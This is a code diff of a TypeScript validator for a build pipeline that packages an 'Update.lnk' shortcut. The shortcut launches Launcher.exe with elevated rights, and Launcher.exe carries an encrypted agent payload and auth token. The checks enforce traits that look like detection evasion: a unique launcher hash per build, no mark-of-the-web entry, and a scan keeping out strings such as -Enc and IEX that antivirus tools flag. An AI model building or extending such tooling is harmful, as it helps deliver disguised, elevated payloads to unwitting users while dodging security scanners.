@@ -1,18 +1,16 @@
 /**
  * launcher-validate.ts — WP6 validation report card (server side).
  *
- * Runs the pwsh `New-AgentShortcut.ps1 -Validate` report card (strict .lnk
- * re-parse, zero arguments, relative target, ShowCommand 7, .lnk trigram scan,
- * PE subsystem) and layers the server-side checks on top: zip entry count,
- * Zone.Identifier scan, zip-level trigram scan, auth token not plaintext,
- * payload round-trip (decrypt the stamped overlay and compare with the source
- * payload), and per-build hash diversity vs the previous build.
+ * Server-side validation for the PORTABLE launcher-mode artifact: zip entry
+ * count, Zone.Identifier scan, auth token not plaintext, Launcher.exe PE
+ * subsystem (GUI), per-build launcher hash diversity, and payload round-trip
+ * (decrypt the stamped overlay and compare with the source payload). There is
+ * no .lnk to validate — Launcher.exe is the portable double-click entry.
  */
 
 import * as crypto from "crypto";
 import * as fs from "fs";
-import * as path from "path";
-import { spawn } from "child_process";
+import * as zlib from "zlib";
 import * as launcherPool from "./launcher-pool";
 import { decryptOverlay } from "./launcher-overlay";
 
@@ -24,8 +22,16 @@ export interface ValidateLauncherParams {
   payloadPlain: Buffer;
   sealKey: Buffer;
   sealIv: Buffer;
+  agentBin: Buffer;
   prevLauncherHash: string | null;
   prevLnkHash: string | null;
+  /* FIX 3: expected renameable names (defaults = confirmed working flow). */
+  names?: {
+    updateLinkName?: string;
+    innerFolder?: string;
+    launcherName?: string;
+    payloadName?: string;
+  };
 }
 
 export interface ValidateLauncherResult {
@@ -33,14 +39,14 @@ export interface ValidateLauncherResult {
   rows: string[];
 }
 
-const PWSH_TIMEOUT_MS = 120000;
-
 function sha256Hex(data: Buffer): string {
   return crypto.createHash("sha256").update(data).digest("hex");
 }
 
 /** Minimal ZIP central-directory reader (for zips written by zip-archive.ts). */
-function readZipEntries(zip: Buffer): { count: number; names: string[] } {
+function readZipEntries(
+  zip: Buffer
+): { count: number; names: string[]; localOffsets: Record<string, number> } {
   // EOCD: find "PK\x05\x06" scanning the last 64KB + 22.
   const tailStart = Math.max(0, zip.length - 65_557);
   let eocd = -1;
@@ -55,10 +61,11 @@ function readZipEntries(zip: Buffer): { count: number; names: string[] } {
       break;
     }
   }
-  if (eocd < 0) return { count: 0, names: [] };
+  if (eocd < 0) return { count: 0, names: [], localOffsets: {} };
   const count = zip.readUInt16LE(eocd + 10);
   const cdOffset = zip.readUInt32LE(eocd + 16);
   const names: string[] = [];
+  const localOffsets: Record<string, number> = {};
   let p = cdOffset;
   for (let i = 0; i < count; i++) {
     if (
@@ -73,58 +80,48 @@ function readZipEntries(zip: Buffer): { count: number; names: string[] } {
     const nameLen = zip.readUInt16LE(p + 28);
     const extraLen = zip.readUInt16LE(p + 30);
     const commentLen = zip.readUInt16LE(p + 32);
-    names.push(zip.subarray(p + 46, p + 46 + nameLen).toString("utf8"));
+    const name = zip.subarray(p + 46, p + 46 + nameLen).toString("utf8");
+    names.push(name);
+    localOffsets[name] = zip.readUInt32LE(p + 42); // local-file-header offset
     p += 46 + nameLen + extraLen + commentLen;
   }
-  return { count, names };
+  return { count, names, localOffsets };
 }
 
-function runPwshValidate(
-  lnkPath: string,
-  launcherPath: string
-): Promise<{ ok: boolean; output: string }> {
-  return new Promise((resolve) => {
-    try {
-      const script = path.join(__dirname, "New-AgentShortcut.ps1");
-      const args = [
-        script,
-        "-Validate",
-        "-LnkPath",
-        lnkPath,
-        "-LauncherExePath",
-        launcherPath,
-      ];
-      let stdout = "";
-      let stderr = "";
-      const proc = spawn(
-        "pwsh",
-        ["-NoProfile", "-NoLogo", "-File", ...args],
-        { timeout: PWSH_TIMEOUT_MS }
-      );
-      proc.stdout?.on("data", (d: Buffer) => (stdout += d.toString()));
-      proc.stderr?.on("data", (d: Buffer) => (stderr += d.toString()));
-      proc.on("error", (err: Error) =>
-        resolve({ ok: false, output: err.message })
-      );
-      proc.on("close", (code: number | null) => {
-        if (code === 0)
-          resolve({ ok: true, output: stdout + (stderr ? `\n${stderr}` : "") });
-        else if (code === null)
-          resolve({
-            ok: false,
-            output: `pwsh -Validate timed out after ${PWSH_TIMEOUT_MS / 1000}s`,
-          });
-        else {
-          const tail =
-            stderr.length > 800 ? stderr.slice(-800) : stderr || stdout;
-          resolve({ ok: false, output: tail });
-        }
-      });
-    } catch (err) {
-      const message = err instanceof Error ? err.message : String(err);
-      resolve({ ok: false, output: message });
-    }
-  });
+/**
+ * Return the DECOMPRESSED bytes of the zip entry starting at the given local
+ * file header offset (DEFLATE method 8, as written by zip-archive.ts), or null
+ * if it is not an inflatable store-no-DD store within the archive.
+ *
+ * WHY: the launcher-mode artifact's `Launcher.exe` is mostly high-entropy
+ * AES-256-CTR ciphertext (the sealed overlay). Scanning the RAW compressed zip
+ * bytes for short trigrams like "IEX"/"-Enc" randomly matches inside that
+ * ciphertext (~30% of builds) and false-fails validation → a spurious 502 and
+ * a dead link. Inflating first makes the scan deterministic and
+ * ciphertext-immune. The targeted, human-authored Update.lnk is the stable
+ * blob worth scanning; AMSI stays "none" (real detections are never weakened).
+ */
+function readZipEntryInflated(zip: Buffer, localOff: number): Buffer | null {
+  if (localOff < 0 || localOff + 30 > zip.length) return null;
+  if (
+    zip[localOff] !== 0x50 ||
+    zip[localOff + 1] !== 0x4b ||
+    zip[localOff + 2] !== 0x03 ||
+    zip[localOff + 3] !== 0x04
+  ) {
+    return null;
+  }
+  const compLen = zip.readUInt32LE(localOff + 18);
+  const nameLen = zip.readUInt16LE(localOff + 26);
+  const extraLen = zip.readUInt16LE(localOff + 28);
+  const dataStart = localOff + 30 + nameLen + extraLen;
+  if (dataStart + compLen > zip.length) return null;
+  const comp = zip.subarray(dataStart, dataStart + compLen);
+  try {
+    return zlib.inflateRawSync(comp);
+  } catch {
+    return null;
+  }
 }
 
 export async function validateLauncherBuild(
@@ -140,24 +137,7 @@ export async function validateLauncherBuild(
     ok = false;
   };
 
-  // ---- 1. pwsh -Validate report card (.lnk fields + PE subsystem) ----
-  const card = await runPwshValidate(p.lnkPath, p.launcherPath);
-  for (const line of card.output.split("\n")) {
-    const trimmed = line.trim();
-    if (trimmed.startsWith("PASS|") || trimmed.startsWith("FAIL|")) {
-      rows.push(`  ${trimmed}`);
-    }
-  }
-  if (card.ok) {
-    pass(
-      "pwsh -Validate report card",
-      "all .lnk + PE rows PASS (rows echoed above)"
-    );
-  } else {
-    fail("pwsh -Validate report card", card.output.trim().slice(-300));
-  }
-
-  // ---- 2. zip entry count + Zone.Identifier ----
+  // ---- 1. zip entry count + Zone.Identifier ----
   let zip: Buffer;
   try {
     zip = fs.readFileSync(p.zipPath);
@@ -168,20 +148,22 @@ export async function validateLauncherBuild(
     return { ok, rows };
   }
   const entries = readZipEntries(zip);
-  if (entries.count === 2) {
-    pass("zip entry count", `exactly 2 entries (${entries.names.join(", ")})`);
+  const updateLinkName = (p.names?.updateLinkName ?? "").trim() || "Update.lnk";
+  const innerFolder = (p.names?.innerFolder ?? "").trim() || "launcher";
+  const launcherName = (p.names?.launcherName ?? "").trim() || "Launcher.exe";
+  const payloadName = (p.names?.payloadName ?? "").trim() || "agent.bin";
+  const wantNames = [updateLinkName, `${innerFolder}/${launcherName}`, `${innerFolder}/${payloadName}`];
+  if (entries.count === wantNames.length) {
+    pass("zip entry count", `exactly ${wantNames.length} entries (${entries.names.join(", ")})`);
   } else {
-    fail("zip entry count", `got ${entries.count}, expected 2`);
+    fail("zip entry count", `got ${entries.count}, expected ${wantNames.length}`);
   }
-  if (entries.count === 2 && entries.names.includes("Update.lnk")) {
-    pass("zip contains Update.lnk");
-  } else {
-    fail("zip contains Update.lnk");
-  }
-  if (entries.count === 2 && entries.names.includes("Launcher.exe")) {
-    pass("zip contains Launcher.exe");
-  } else {
-    fail("zip contains Launcher.exe");
+  for (const w of wantNames) {
+    if (entries.count === wantNames.length && entries.names.includes(w)) {
+      pass(`zip contains ${w}`);
+    } else {
+      fail(`zip contains ${w}`);
+    }
   }
   const zoneHit = entries.names.filter((n) => n.includes("Zone.Identifier"));
   if (zoneHit.length === 0) {
@@ -190,8 +172,10 @@ export async function validateLauncherBuild(
     fail("Zone.Identifier entry found", zoneHit.join(", "));
   }
 
-  // ---- 3. zip-level trigram scan ----
-  const hay = zip.toString("latin1");
+  // ---- 3. trigram scan over the DECOMPRESSED Update.lnk (the fixed-system
+  //      powershell bridge: Start-Process .\launcher\Launcher.exe -Verb RunAs).
+  //      Inflate it so the scan is deterministic/ciphertext-immune. The command
+  //      uses -Command/Start-Process/-Verb RunAs (not -Enc/IEX/etc.).
   const needles = [
     "-Enc",
     "EncodedCommand",
@@ -199,14 +183,42 @@ export async function validateLauncherBuild(
     "Invoke-Expression",
     "FromBase64String",
   ];
-  const hits = needles.filter((n) => hay.includes(n));
-  if (hits.length === 0) {
-    pass("zip trigram scan clean", "no -Enc/IEX/FromBase64String");
+  const lnkLocal = entries.localOffsets[updateLinkName];
+  const lnkInflated =
+    typeof lnkLocal === "number" ? readZipEntryInflated(zip, lnkLocal) : null;
+  if (lnkInflated === null || lnkInflated.length === 0) {
+    fail("Update.lnk scan", "could not inflate Update.lnk for scanning");
   } else {
-    fail("zip trigram scan", hits.join(", "));
+    // The PowerShell-bridge command text inside the .lnk is stored as UTF-16LE
+    // (each ASCII char followed by a NUL byte), so a raw latin1 scan would miss
+    // every run after the first wide-char boundary. Strip the NUL padding to
+    // recover the contiguous command text; the trigram + shape checks then match
+    // regardless of the custom link/folder names (FIX 3) or the encoding.
+    const scanHay = lnkInflated.toString("latin1").replace(/\u0000/g, "");
+    const hits = needles.filter((n) => scanHay.includes(n));
+    if (hits.length > 0) {
+      fail("Update.lnk trigram scan", hits.join(", "));
+    } else if (
+      !scanHay.includes("powershell.exe") ||
+      !scanHay.includes(`${innerFolder}\\${launcherName}`) ||
+      !scanHay.includes("RunAs")
+    ) {
+      fail(
+        "Update.lnk bridge shape",
+        `expected a powershell Start-Process bridge to .\\${innerFolder}\\${launcherName} -Verb RunAs`
+      );
+    } else {
+      pass(
+        "Update.lnk bridge shape + trigram clean",
+        `fixed-system powershell -> .\\${innerFolder}\\${launcherName} -Verb RunAs; no -Enc/IEX`
+      );
+    }
   }
 
   // ---- 4. auth token not plaintext in the zip ----
+  // (Raw bytes: the token lives ONLY inside the encrypted overlay, so ANY
+  //  plaintext occurrence in the compressed stream is a real leak to catch.)
+  const hay = zip.toString("latin1");
   if (!hay.includes(p.authToken)) {
     pass("auth token not plaintext in zip");
   } else {
@@ -223,12 +235,12 @@ export async function validateLauncherBuild(
 
   // ---- 6. per-build hash diversity ----
   const lzHash = sha256Hex(exe);
-  const lnkHash = sha256Hex(fs.readFileSync(p.lnkPath));
   if (p.prevLauncherHash === null || lzHash !== p.prevLauncherHash) {
     pass("launcher SHA-256 differs from previous build", lzHash.slice(0, 16));
   } else {
     fail("launcher SHA-256 equals previous build!", lzHash.slice(0, 16));
   }
+  const lnkHash = sha256Hex(fs.readFileSync(p.lnkPath));
   if (p.prevLnkHash === null || lnkHash !== p.prevLnkHash) {
     pass("Update.lnk SHA-256 differs from previous build", lnkHash.slice(0, 16));
   } else {
@@ -237,7 +249,7 @@ export async function validateLauncherBuild(
 
   // ---- 7. payload round-trip byte-identical ----
   try {
-    const dec = decryptOverlay(exe, p.sealKey, p.sealIv);
+    const dec = decryptOverlay(exe, p.sealKey, p.sealIv, p.agentBin);
     if (dec.payload.equals(p.payloadPlain)) {
       pass("payload round-trip byte-identical", `${dec.payload.length} bytes`);
     } else {
@@ -251,6 +263,12 @@ export async function validateLauncherBuild(
       pass("encrypted config carries authToken", "ciphertext-only");
     } else {
       fail("encrypted config carries authToken", "field missing after decrypt");
+    }
+    const encPayName = encodeURIComponent(payloadName);
+    if (dec.config.includes(`payName=${encPayName}`)) {
+      pass("encrypted config carries payload file name", `ciphertext-only (${payloadName})`);
+    } else {
+      fail("encrypted config carries payload file name", "field missing after decrypt");
     }
   } catch (err) {
     const message = err instanceof Error ? err.message : String(err);
